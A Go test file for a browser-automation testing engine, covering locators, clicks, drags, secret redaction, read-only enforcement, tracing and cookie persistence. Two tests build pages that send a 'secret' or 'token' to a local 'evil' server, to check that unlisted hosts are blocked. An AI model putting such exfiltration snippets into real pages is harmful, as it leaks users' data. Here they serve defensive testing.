package web_test

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jancuk/semar/internal/config"
	"github.com/jancuk/semar/internal/domain"
	"github.com/jancuk/semar/internal/effects"
	"github.com/jancuk/semar/internal/engine/web"
	"github.com/jancuk/semar/internal/evidence"
	"github.com/jancuk/semar/internal/recorder"
	"github.com/jancuk/semar/internal/redact"
	"github.com/jancuk/semar/internal/secret"
)

const boardPage = `<!doctype html><html><head><title>Board</title></head><body>
<h1>Board</h1>
<button id="add" data-testid="add-card">Add card</button>
<button id="rename" class="plain">Rename</button>
<div id="todo" role="list" aria-label="Todo" data-testid="todo">
  <div class="card" role="listitem" draggable="true">Buy milk</div>
  <div class="card" role="listitem" draggable="true">Buy eggs</div>
</div>
<div id="doing" role="list" aria-label="Doing" data-testid="doing"><p class="hint">Drop here</p></div>
<p id="status">idle</p>
<p id="hidden" style="display:none">secret corner</p>
<ul><li class="row">one</li><li class="row">two</li></ul>
<script>
const todo = document.getElementById('todo'), doing = document.getElementById('doing'), status = document.getElementById('status');
let dragged = null;
document.addEventListener('dragstart', e => { dragged = e.target; e.dataTransfer.setData('text/plain', e.target.textContent); });
doing.addEventListener('dragover', e => e.preventDefault());
doing.addEventListener('drop', e => { e.preventDefault(); doing.querySelector('.hint')?.remove(); doing.appendChild(dragged); status.textContent = 'moved ' + dragged.textContent; });
document.getElementById('add').addEventListener('click', async () => {
  status.textContent = 'adding';
  await fetch('/api/slow');
  const d = document.createElement('div');
  d.className = 'card'; d.setAttribute('role', 'listitem'); d.draggable = true; d.textContent = 'New card';
  todo.appendChild(d);
  status.textContent = 'added';
});
document.getElementById('rename').addEventListener('click', () => { document.getElementById('rename').textContent = 'Renamed'; });
document.addEventListener('keydown', e => { if (e.key === 'Escape') status.textContent = 'escaped'; });
</script></body></html>`

const loginPage = `<!doctype html><html><head><title>Sign in</title></head><body>
<label>Email <input type="text" id="email"></label>
<label>Password <input type="password" id="pw"></label>
<button id="go">Sign in</button>
<div id="echo"></div><p id="welcome"></p>
<script>
document.getElementById('go').addEventListener('click', () => {
  document.getElementById('welcome').textContent = 'Signed in as ' + document.getElementById('email').value;
  document.getElementById('echo').textContent = document.getElementById('pw').value;
});
document.getElementById('pw').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('welcome').textContent = 'entered'; });
</script></body></html>`

type rig struct {
	t      *testing.T
	eng    *web.Engine
	run    *evidence.Run
	store  *evidence.Store
	srv    *httptest.Server
	home   string
	policy *effects.Policy
	seen   *seenRequests
	step   int
	as     string // the account of the next steps; "" is default
}

type seenRequests struct {
	mu    sync.Mutex
	trace []string
	paths []string
}

func (s *seenRequests) add(path, trace string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.paths = append(s.paths, path)
	if trace != "" {
		s.trace = append(s.trace, trace)
	}
}

func needChrome(t *testing.T) {
	t.Helper()
	if _, err := web.FindChrome(""); err != nil {
		t.Skip("skipped: " + err.Error())
	}
}

type rigOptions struct {
	mode    string
	extra   []string // more hosts to list
	chrome  string
	secrets map[string]string
	handler func(mux *http.ServeMux)
	// accounts is the web sign-in of each account, by the name of the account.
	accounts      map[string]config.WebSignIn
	actionTimeout time.Duration
}

func newRig(t *testing.T, o rigOptions) *rig {
	t.Helper()
	seen := &seenRequests{}
	mux := http.NewServeMux()
	mux.HandleFunc("/board", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, boardPage) })
	mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, loginPage) })
	mux.HandleFunc("/autofill", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, autofillPage) })
	mux.HandleFunc("/api/slow", func(w http.ResponseWriter, r *http.Request) {
		seen.add(r.URL.Path, r.Header.Get("traceparent"))
		time.Sleep(300 * time.Millisecond)
		fmt.Fprint(w, "ok")
	})
	if o.handler != nil {
		o.handler(mux)
	}
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	u, _ := url.Parse(srv.URL)

	mode := o.mode
	if mode == "" {
		mode = "test_data"
	}
	policy, err := effects.New(config.Environment{
		Hosts:   append([]string{u.Host}, o.extra...),
		Methods: []string{"GET", "POST"},
		Effects: config.Effects{Mode: mode},
	})
	if err != nil {
		t.Fatal(err)
	}
	store, err := evidence.Open(filepath.Join(t.TempDir(), ".semar"))
	if err != nil {
		t.Fatal(err)
	}
	run, err := store.NewRun("r-1")
	if err != nil {
		t.Fatal(err)
	}
	key, err := store.RedactKey()
	if err != nil {
		t.Fatal(err)
	}
	env := secret.NewEnv(func(k string) (string, bool) { v, ok := o.secrets[k]; return v, ok })
	red, err := redact.New(config.Redact{}, env.Loaded, key)
	if err != nil {
		t.Fatal(err)
	}
	rec := recorder.New(run, red, func(m string, u *url.URL) effects.Class {
		return policy.Classify(effects.Request{Method: m, URL: u})
	}, "r-1")
	home := t.TempDir()
	eng := web.New(web.Options{
		Policy: policy, Recorder: rec, Files: run, Services: map[string]string{"app": srv.URL},
		Secrets: env, Home: home, Environment: "test", Chrome: o.chrome, Run: "r-1",
		Accounts: o.accounts, ActionTimeout: o.actionTimeout,
	})
	t.Cleanup(eng.Close)
	return &rig{t: t, eng: eng, run: run, store: store, srv: srv, home: home, policy: policy, seen: seen}
}

func (r *rig) do(w domain.WebAction, locs map[string]domain.Locator, watch ...web.Watched) web.Result {
	r.t.Helper()
	res, err := r.try(w, locs, watch...)
	if err != nil {
		r.t.Fatalf("%s %s: %v", w.Do, w.Element, err)
	}
	return res
}

func (r *rig) try(w domain.WebAction, locs map[string]domain.Locator, watch ...web.Watched) (web.Result, error) {
	r.step++
	w.Service, w.App = "app", "kanban"
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	return r.eng.Do(ctx, web.Call{
		Use:      domain.UseCase{Pass: domain.PassScenario, Scenario: "board", Step: domain.StepID(fmt.Sprintf("s%d", r.step))},
		By:       domain.ActorReplay,
		Action:   w,
		Locators: locs,
		Watch:    watch,
		Why:      "the step " + string(w.Do),

		AuthProfile: r.as,
	})
}

func open(path string) domain.WebAction { return domain.WebAction{Do: domain.WebOpen, Path: path} }

func act(do domain.WebOp, element string) domain.WebAction {
	return domain.WebAction{Do: do, Screen: "Board", Element: element}
}

func text(element string) web.Watched { return web.Watched{Element: element} }

func TestOpenAndReadAnElement(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	locs := map[string]domain.Locator{
		"title":  {Role: "heading", Name: "Board"},
		"status": {CSS: "#status"},
	}
	res := r.do(open("/board"), nil)
	if res.Action.Web == nil || res.Action.Web.Op != "open" || !strings.HasSuffix(res.Action.Web.URL, "/board") {
		t.Fatalf("open = %+v", res.Action.Web)
	}
	if res.Action.Surface != domain.SurfaceWeb || res.Action.By != domain.ActorReplay || res.Action.Err != "" {
		t.Fatalf("action = %+v", res.Action)
	}
	res = r.do(domain.WebAction{Do: domain.WebWait}, locs, text("title"), text("status"))
	got := res.Action.Web.Elements
	if !got["title"].Found || got["title"].Text != "Board" || got["title"].Count != 1 {
		t.Errorf("title = %+v", got["title"])
	}
	if got["status"].Text != "idle" {
		t.Errorf("status = %+v", got["status"])
	}
}

func TestEveryActionLeavesAScreenshot(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	res := r.do(open("/board"), nil)
	shot := res.Action.Web.Screenshot
	if !strings.HasPrefix(shot, "screenshots/board/") || !strings.HasSuffix(shot, ".png") {
		t.Fatalf("screenshot = %q", shot)
	}
	data, err := os.ReadFile(filepath.Join(r.store.Root(), "runs", "r-1", filepath.FromSlash(shot)))
	if err != nil {
		t.Fatal(err)
	}
	if len(data) < 8 || string(data[1:4]) != "PNG" {
		t.Errorf("the file is not a PNG: %d bytes", len(data))
	}
}

func TestLocatorStrategies(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	locs := map[string]domain.Locator{
		"by-test-id":   {TestID: "add-card"},
		"by-role":      {Role: "button", Name: "Add card"},
		"by-text":      {Text: "Buy eggs"},
		"by-css":       {CSS: "#status"},
		"within":       {Role: "listitem", Within: "todo-list"},
		"todo-list":    {TestID: "todo"},
		"many":         {CSS: "li.row"},
		"hidden":       {CSS: "#hidden"},
		"missing":      {Role: "button", Name: "Nothing like it"},
		"first-wins":   {TestID: "add-card", CSS: "li.row"},
		"order-by-css": {CSS: ".card", Within: "doing-list"},
		"doing-list":   {TestID: "doing"},
	}
	var watch []web.Watched
	for name := range locs {
		watch = append(watch, text(name))
	}
	res := r.do(domain.WebAction{Do: domain.WebWait}, locs, watch...)
	st := res.Action.Web.Elements
	for name, want := range map[string]struct {
		found   bool
		count   int
		visible bool
		text    string
	}{
		"by-test-id":   {true, 1, true, "Add card"},
		"by-role":      {true, 1, true, "Add card"},
		"by-text":      {true, 1, true, "Buy eggs"},
		"by-css":       {true, 1, true, "idle"},
		"within":       {false, 2, true, ""},
		"many":         {false, 2, true, ""},
		"hidden":       {false, 1, false, ""},
		"missing":      {false, 0, false, ""},
		"first-wins":   {true, 1, true, "Add card"},
		"order-by-css": {false, 0, false, ""},
	} {
		got := st[name]
		if got.Found != want.found || got.Count != want.count || got.Visible != want.visible || got.Text != want.text {
			t.Errorf("%s = %+v, want %+v", name, got, want)
		}
	}
}

func TestClickWaitsForThePageToSettle(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	locs := map[string]domain.Locator{
		"add":    {Role: "button", Name: "Add card"},
		"status": {CSS: "#status"},
		"cards":  {Role: "listitem", Within: "todo"},
		"todo":   {TestID: "todo"},
	}
	res := r.do(act(domain.WebClick, "add"), locs, text("status"), web.Watched{Element: "cards", Presence: true})
	got := res.Action.Web.Elements
	if got["status"].Text != "added" {
		t.Errorf("status = %q, want added: the check read before the page settled", got["status"].Text)
	}
	if got["cards"].Count != 3 {
		t.Errorf("cards = %+v, want 3", got["cards"])
	}
	if res.Action.Web.Target == nil || res.Action.Web.Target.Name != "Add card" {
		t.Errorf("target = %+v", res.Action.Web.Target)
	}
}

func TestDragMovesACard(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	locs := map[string]domain.Locator{
		"milk":   {Text: "Buy milk"},
		"doing":  {TestID: "doing"},
		"status": {CSS: "#status"},
		"moved":  {Role: "listitem", Within: "doing"},
	}
	w := act(domain.WebDrag, "milk")
	w.To = "doing"
	res := r.do(w, locs, text("status"), text("moved"))
	got := res.Action.Web.Elements
	if got["status"].Text != "moved Buy milk" {
		t.Errorf("status = %q (err %q)", got["status"].Text, res.Action.Err)
	}
	if !got["moved"].Found || got["moved"].Text != "Buy milk" {
		t.Errorf("moved = %+v", got["moved"])
	}
}

func TestFillAndPressWithASecret(t *testing.T) {
	needChrome(t)
	const pw = "correct-horse-battery"
	r := newRig(t, rigOptions{secrets: map[string]string{"SHOP_PASSWORD": pw}})
	r.do(open("/login"), nil)
	locs := map[string]domain.Locator{
		"email":   {Role: "textbox", Name: "Email"},
		"pw":      {Role: "textbox", Name: "Password"},
		"pw-css":  {CSS: "#pw"},
		"go":      {Role: "button", Name: "Sign in"},
		"welcome": {CSS: "#welcome"},
		"echo":    {CSS: "#echo"},
	}
	login := func(do domain.WebOp, el string) domain.WebAction {
		return domain.WebAction{Do: do, Screen: "Login", Element: el}
	}
	f := login(domain.WebFill, "email")
	f.Value = "ana@example.com"
	r.do(f, locs)
	f = login(domain.WebFill, "pw-css")
	f.Secret = "env:SHOP_PASSWORD"
	r.do(f, locs)
	res := r.do(login(domain.WebClick, "go"), locs, text("welcome"), text("echo"))
	got := res.Action.Web.Elements
	if got["welcome"].Text != "Signed in as ana@example.com" {
		t.Errorf("welcome = %q (err %q)", got["welcome"].Text, res.Action.Err)
	}
	if !redact.IsMarker(got["echo"].Text) {
		t.Errorf("the page echoed the secret and the record shows %q, want a marker", got["echo"].Text)
	}
	if raw := res.Action; strings.Contains(fmt.Sprintf("%+v", raw), pw) {
		t.Errorf("the stored action holds the secret")
	}

	// Enter in the password field.
	p := login(domain.WebPress, "pw-css")
	p.Value = "Enter"
	res = r.do(p, locs, text("welcome"))
	if got := res.Action.Web.Elements["welcome"].Text; got != "entered" {
		t.Errorf("after Enter welcome = %q (err %q)", got, res.Action.Err)
	}
	if blob, _ := json.Marshal(res.Action); strings.Contains(string(blob), pw) {
		t.Errorf("a stored action holds the secret: %s", blob)
	}
}

// The field is filled by the page right after it takes focus, as a browser's saved sign-in does.
const autofillPage = `<!doctype html><html><head><title>Sign in</title></head><body>
<label>Email <input type="text" id="email"></label>
<script>
document.getElementById('email').addEventListener('focus', e => {
  setTimeout(() => { e.target.value = 'saved@example.com'; e.target.setSelectionRange(99, 99); }, 0);
}, { once: true });
</script></body></html>`

func TestFillReplacesWhatAFieldWasGivenWhenItTookFocus(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/autofill"), nil)
	locs := map[string]domain.Locator{"email": {Role: "textbox", Name: "Email"}}
	f := domain.WebAction{Do: domain.WebFill, Screen: "Login", Element: "email", Value: "ana@example.com"}
	res := r.do(f, locs, text("email"))
	if res.Action.Err != "" {
		t.Fatalf("fill: %s", res.Action.Err)
	}
	if got := res.Action.Web.Elements["email"].Text; got != "ana@example.com" {
		t.Errorf("the field holds %q, want only the typed text", got)
	}
}

func TestPressAKeyOnThePage(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	p := domain.WebAction{Do: domain.WebPress, Value: "Escape"}
	res := r.do(p, map[string]domain.Locator{"status": {CSS: "#status"}}, text("status"))
	if got := res.Action.Web.Elements["status"].Text; got != "escaped" {
		t.Errorf("status = %q (err %q)", got, res.Action.Err)
	}
}

func TestAnElementThatIsNotFoundEndsTheActionWithRepairCandidates(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	locs := map[string]domain.Locator{"rename": {Role: "button", Name: "Rename card"}}
	res := r.do(act(domain.WebClick, "rename"), locs, text("rename"))
	if !strings.HasPrefix(res.Action.Err, "an element was not found: either the product changed or the script is out of date") {
		t.Fatalf("err = %q", res.Action.Err)
	}
	if st := res.Action.Web.Elements["rename"]; st.Found || st.Count != 0 {
		t.Errorf("state = %+v", st)
	}
	if len(res.Action.Web.Repair) == 0 {
		t.Fatalf("no repair candidate")
	}
	c := res.Action.Web.Repair[0]
	if c.Element != "rename" || c.Locator.Role != "button" || c.Locator.Name != "Rename" || c.Why == "" {
		t.Errorf("candidate = %+v", c)
	}
	if res.Action.Web.Screenshot == "" {
		t.Error("a step that ended not found has no screenshot")
	}
}

func TestACoveredElementIsNotClicked(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/covered", func(w http.ResponseWriter, r *http.Request) {
			fmt.Fprint(w, `<!doctype html><button id="b" style="position:absolute;left:10px;top:10px;width:100px;height:40px" onclick="document.title='clicked'">Pay</button>
<div style="position:absolute;left:0;top:0;width:300px;height:200px;background:#fff"></div><p id="p">x</p>`)
		})
	}})
	r.do(open("/covered"), nil)
	res := r.do(act(domain.WebClick, "pay"), map[string]domain.Locator{"pay": {Role: "button", Name: "Pay"}})
	if !strings.Contains(res.Action.Err, "covered") {
		t.Errorf("err = %q", res.Action.Err)
	}
}

func TestAWriteIsRefusedInAReadOnlyEnvironment(t *testing.T) {
	// No Chrome is needed: a refused action never starts a browser.
	r := newRig(t, rigOptions{mode: "read_only", chrome: "/does/not/exist"})
	for do, w := range map[domain.WebOp]domain.WebAction{
		domain.WebClick: act(domain.WebClick, "x"),
		domain.WebFill:  {Do: domain.WebFill, Screen: "Board", Element: "x", Value: "v"},
		domain.WebPress: {Do: domain.WebPress, Value: "Enter"},
		domain.WebDrag:  {Do: domain.WebDrag, Screen: "Board", Element: "x", To: "y"},
	} {
		res, err := r.try(w, nil)
		if err != nil {
			t.Fatalf("%s: %v", do, err)
		}
		if !strings.Contains(res.Action.Refused, "read_only") || !strings.Contains(res.Action.Refused, string(do)) {
			t.Errorf("%s: refused = %q", do, res.Action.Refused)
		}
	}
	_, err := r.try(open("/board"), nil)
	if !errors.Is(err, web.ErrChromeNotFound) {
		t.Errorf("an open in a read-only environment needs a browser: %v", err)
	}
}

func TestAWriteNeedsAUseCase(t *testing.T) {
	r := newRig(t, rigOptions{chrome: "/does/not/exist"})
	res, err := r.eng.Do(context.Background(), web.Call{Action: domain.WebAction{Service: "app", Do: domain.WebClick, Screen: "B", Element: "x"}})
	if err != nil || !strings.Contains(res.Action.Refused, "a write must belong to") {
		t.Errorf("result = %+v, %v", res.Action.Refused, err)
	}
}

func TestOpenOfAnUnlistedHostIsRefused(t *testing.T) {
	r := newRig(t, rigOptions{chrome: "/does/not/exist"})
	r.eng = web.New(web.Options{
		Policy: r.policy, Recorder: recorderOf(t, r), Files: r.run, Services: map[string]string{"app": "http://unlisted.example.test"},
		Home: r.home, Environment: "test", Chrome: "/does/not/exist",
	})
	res, err := r.try(open("/board"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Action.Refused, "host_not_allowed") {
		t.Errorf("refused = %q", res.Action.Refused)
	}
}

func TestChromeNotFound(t *testing.T) {
	r := newRig(t, rigOptions{chrome: "/does/not/exist"})
	_, err := r.try(open("/board"), nil)
	if !errors.Is(err, web.ErrChromeNotFound) {
		t.Fatalf("error = %v, want ErrChromeNotFound", err)
	}
	if !strings.Contains(err.Error(), "install Chrome or correct web.chrome in semar.yaml") {
		t.Errorf("error = %v", err)
	}
	if !strings.Contains(web.ErrChromeNotFound.Error(), "Chrome was not found: install Chrome or set web.chrome in semar.yaml") {
		t.Errorf("text = %v", web.ErrChromeNotFound)
	}
}

func TestTheBrowserBlocksHostsThatAreNotListed(t *testing.T) {
	needChrome(t)
	var mu sync.Mutex
	hits := 0
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		mu.Lock()
		hits++
		mu.Unlock()
		w.Header().Set("Access-Control-Allow-Origin", "*")
		fmt.Fprint(w, "evil")
	}))
	defer evil.Close()
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/leaky", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprintf(w, `<!doctype html><p id="r">pending</p><script>
fetch(%q).then(x => x.text()).then(t => { document.getElementById('r').textContent = 'got ' + t; }).catch(() => { document.getElementById('r').textContent = 'blocked'; });
</script>`, evil.URL+"/steal?secret=value")
		})
	}})
	r.do(open("/leaky"), nil)
	res := r.do(domain.WebAction{Do: domain.WebWait}, map[string]domain.Locator{"r": {CSS: "#r"}}, text("r"))
	if got := res.Action.Web.Elements["r"].Text; got != "blocked" {
		t.Errorf("the page read %q from a host that is not listed", got)
	}
	mu.Lock()
	defer mu.Unlock()
	if hits != 0 {
		t.Errorf("the other host was reached %d times", hits)
	}
}

func TestBlockedHostsAreRecordedWithoutAPath(t *testing.T) {
	needChrome(t)
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { fmt.Fprint(w, "evil") }))
	defer evil.Close()
	evilHost := strings.TrimPrefix(evil.URL, "http://")
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/leaky", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprintf(w, `<!doctype html><p>x</p><img src=%q>`, evil.URL+"/pixel.png?token=abc123")
		})
	}})
	res := r.do(open("/leaky"), nil)
	if got := res.Action.Web.Blocked; len(got) != 1 || got[0] != evilHost {
		t.Errorf("blocked = %v, want [%s]", got, evilHost)
	}
	if blob, _ := json.Marshal(res.Action); strings.Contains(string(blob), "abc123") {
		t.Errorf("the record holds the query of a blocked request: %s", blob)
	}
}

var traceparent = regexp.MustCompile(`^00-([0-9a-f]{32})-[0-9a-f]{16}-01$`)

func TestTheBrowserAddsATraceparentToAllowedRequests(t *testing.T) {
	needChrome(t)
	other := &seenRequests{}
	second := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		other.add(r.URL.Path, r.Header.Get("traceparent"))
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "*")
		fmt.Fprint(w, "second")
	}))
	defer second.Close()
	secondHost := strings.TrimPrefix(second.URL, "http://")
	r := newRig(t, rigOptions{extra: []string{secondHost}, handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/two", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprintf(w, `<!doctype html><p id="r">pending</p><script>
fetch('/api/slow').then(() => fetch(%q)).then(x => x.text()).then(t => { document.getElementById('r').textContent = t; });
</script>`, second.URL+"/other")
		})
	}})
	res := r.do(open("/two"), map[string]domain.Locator{"r": {CSS: "#r"}}, text("r"))
	if got := res.Action.Web.Elements["r"].Text; got != "second" {
		t.Fatalf("the page read %q from the second listed host (err %q)", got, res.Action.Err)
	}
	r.seen.mu.Lock()
	other.mu.Lock()
	defer r.seen.mu.Unlock()
	defer other.mu.Unlock()
	if len(r.seen.trace) == 0 || len(other.trace) == 0 {
		t.Fatalf("traceparent seen by the first host %v and by the second host %v: both must get one", r.seen.trace, other.trace)
	}
	for _, tp := range append(append([]string{}, r.seen.trace...), other.trace...) {
		m := traceparent.FindStringSubmatch(tp)
		if m == nil {
			t.Errorf("traceparent %q is not a W3C traceparent", tp)
		} else if m[1] != res.Action.TraceID {
			t.Errorf("trace %s is not the trace %s of the action", m[1], res.Action.TraceID)
		}
	}
}

func TestAPageCannotWriteInAReadOnlyEnvironment(t *testing.T) {
	needChrome(t)
	var mu sync.Mutex
	posts := 0
	r := newRig(t, rigOptions{mode: "read_only", handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/poster", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `<!doctype html><p id="r">pending</p><script>
fetch('/save', { method: 'POST', body: 'x' }).then(() => { document.getElementById('r').textContent = 'saved'; }).catch(() => { document.getElementById('r').textContent = 'blocked'; });
</script>`)
		})
		mux.HandleFunc("/save", func(w http.ResponseWriter, req *http.Request) {
			mu.Lock()
			posts++
			mu.Unlock()
		})
	}})
	r.do(open("/poster"), nil)
	res := r.do(domain.WebAction{Do: domain.WebWait}, map[string]domain.Locator{"r": {CSS: "#r"}}, text("r"))
	if got := res.Action.Web.Elements["r"].Text; got != "blocked" {
		t.Errorf("the page wrote in a read-only environment and read %q", got)
	}
	mu.Lock()
	defer mu.Unlock()
	if posts != 0 {
		t.Errorf("the server got %d writes", posts)
	}
}

func TestTheProfileKeepsACookieAcrossRuns(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/set", func(w http.ResponseWriter, _ *http.Request) {
			http.SetCookie(w, &http.Cookie{Name: "session", Value: "kept", Path: "/", Expires: time.Now().Add(24 * time.Hour)})
			fmt.Fprint(w, "<p>set</p>")
		})
		mux.HandleFunc("/who", func(w http.ResponseWriter, req *http.Request) {
			c, err := req.Cookie("session")
			if err != nil {
				fmt.Fprint(w, `<p id="who">nobody</p>`)
				return
			}
			fmt.Fprintf(w, `<p id="who">%s</p>`, c.Value)
		})
	}})
	r.do(open("/set"), nil)
	r.eng.Close()

	second := web.New(web.Options{
		Policy: r.policy, Recorder: recorderOf(t, r), Files: r.run, Services: map[string]string{"app": r.srv.URL},
		Home: r.home, Environment: "test", Run: "r-1",
	})
	defer second.Close()
	call := web.Call{
		Use: domain.UseCase{Pass: domain.PassScenario, Scenario: "board", Step: "who"}, By: domain.ActorReplay,
		Action:   domain.WebAction{Service: "app", Do: domain.WebOpen, Path: "/who"},
		Locators: map[string]domain.Locator{"who": {CSS: "#who"}}, Watch: []web.Watched{text("who")},
	}
	res, err := second.Do(context.Background(), call)
	if err != nil {
		t.Fatal(err)
	}
	if got := res.Action.Web.Elements["who"].Text; got != "kept" {
		t.Errorf("who = %q, want the cookie of the earlier run", got)
	}
	if _, err := os.Stat(filepath.Join(r.home, "browser", "test", "default")); err != nil {
		t.Errorf("the profile is not at browser/<environment>/<account> of the Semar home: %v", err)
	}
}

func recorderOf(t *testing.T, r *rig) *recorder.Recorder {
	t.Helper()
	key, err := r.store.RedactKey()
	if err != nil {
		t.Fatal(err)
	}
	red, err := redact.New(config.Redact{}, nil, key)
	if err != nil {
		t.Fatal(err)
	}
	return recorder.New(r.run, red, func(m string, u *url.URL) effects.Class {
		return r.policy.Classify(effects.Request{Method: m, URL: u})
	}, "r-2")
}

func TestWaitForAnElementThatAppearsLater(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/later", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `<!doctype html><p>soon</p><script>setTimeout(() => { const b = document.createElement('button'); b.textContent = 'Ready'; document.body.appendChild(b); }, 1500);</script>`)
		})
	}})
	r.do(open("/later"), nil)
	w := domain.WebAction{Do: domain.WebWait, Screen: "Board", Element: "ready"}
	res := r.do(w, map[string]domain.Locator{"ready": {Role: "button", Name: "Ready"}}, text("ready"))
	if res.Action.Err != "" || !res.Action.Web.Elements["ready"].Found {
		t.Errorf("wait gave %+v (err %q)", res.Action.Web.Elements["ready"], res.Action.Err)
	}
}

func TestAnUnknownKeyIsAnError(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	res := r.do(domain.WebAction{Do: domain.WebPress, Value: "Hyper"}, nil)
	if !strings.Contains(res.Action.Err, `the key "Hyper" is not known`) {
		t.Errorf("err = %q", res.Action.Err)
	}
}

func TestOpenAPageRouteAndQuery(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/spa", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `<!doctype html><p id="where"></p><script>document.getElementById('where').textContent = location.search + location.hash;</script>`)
		})
	}})
	res := r.do(open("/spa?tab=x#/boards/b-1"), map[string]domain.Locator{"where": {CSS: "#where"}}, text("where"))
	if got := res.Action.Web.Elements["where"].Text; got != "?tab=x#/boards/b-1" {
		t.Errorf("the page saw %q (err %q)", got, res.Action.Err)
	}
}

func TestAMissOfTheTargetIsRecordedEvenWhenNoCheckWatchesIt(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	res := r.do(act(domain.WebClick, "rename"), map[string]domain.Locator{"rename": {Role: "button", Name: "Rename card"}})
	st, ok := res.Action.Web.Elements["rename"]
	if !ok || st.Count != 0 || st.Locator == nil || st.Locator.Name != "Rename card" {
		t.Errorf("the miss of the target is not in the record: %+v", res.Action.Web.Elements)
	}
	if len(res.Action.Web.Repair) == 0 || res.Action.Web.Repair[0].Element != "rename" {
		t.Errorf("repair = %+v", res.Action.Web.Repair)
	}
}

func TestATargetThatVanishesAfterTheClickIsNoMiss(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{handler: func(mux *http.ServeMux) {
		mux.HandleFunc("/once", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `<!doctype html><button onclick="this.remove()">Once</button>`)
		})
	}})
	r.do(open("/once"), nil)
	res := r.do(act(domain.WebClick, "once"), map[string]domain.Locator{"once": {Role: "button", Name: "Once"}})
	if res.Action.Err != "" || len(res.Action.Web.Repair) != 0 || len(res.Action.Web.Elements) != 0 {
		t.Errorf("a button that went away after its click is reported as a miss: %+v (err %q)", res.Action.Web, res.Action.Err)
	}
}

func TestAPresenceCheckOfAnAbsentElementIsNoMiss(t *testing.T) {
	needChrome(t)
	r := newRig(t, rigOptions{})
	r.do(open("/board"), nil)
	res := r.do(domain.WebAction{Do: domain.WebWait}, map[string]domain.Locator{"ghost": {CSS: ".ghost"}}, web.Watched{Element: "ghost", Presence: true})
	st := res.Action.Web.Elements["ghost"]
	if st.Count != 0 || !st.Presence || len(res.Action.Web.Repair) != 0 {
		t.Errorf("state = %+v, repair = %+v", st, res.Action.Web.Repair)
	}
}
